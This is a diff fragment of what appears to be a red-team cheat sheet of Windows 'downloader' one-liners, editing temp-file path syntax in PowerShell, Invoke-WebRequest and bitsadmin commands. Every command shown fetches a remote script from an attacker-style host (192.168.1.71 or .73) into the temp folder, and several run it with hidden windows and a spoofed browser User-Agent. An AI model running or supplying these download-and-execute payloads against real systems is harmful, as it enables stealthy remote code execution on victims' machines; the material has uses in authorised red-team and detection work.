@@ -2082,7 +2082,7 @@ Powershell Downloaders<br />
 
       Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
 
-      powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile C:\file.txt
+      powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile $env:tmp\file.txt
 
       powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
 
@@ -2105,9 +2105,9 @@ BitsAdmin Downloaders<br />
 
       powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
 
-      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\\hello.ps1'
+      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '$env:tmp\hello.ps1'
 
-      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko  http://192.168.1.73/hello.ps1 $env:tmp\\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\\hello.ps1'
+      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko  http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
 
 <br />
 Curl Downloaders<br />
